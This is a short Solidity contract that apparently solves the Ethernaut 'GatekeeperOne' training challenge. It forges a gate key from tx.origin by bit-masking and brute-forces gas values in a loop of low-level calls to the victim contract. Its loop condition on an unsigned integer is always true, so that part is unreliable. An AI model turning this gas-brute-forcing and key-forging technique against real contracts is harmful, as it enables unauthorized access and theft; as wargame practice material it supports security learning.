// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import './GatekeeperOne.sol';

contract GatekeeperOneAttack{
    GatekeeperOne public victim;

    constructor(address _victim){
        victim = GatekeeperOne(_victim);
    }

    function attack() external{
        bytes8 gateKey = bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF;

        for (uint256 extra = 300; extra >= 0; extra--){
            (bool success, ) = address(victim).call{gas: extra+ (1891*3)}(abi.encodeWithSignature("enter(bytes8)", gateKey));
            if (success){
                break;
            }
        }
    }   
}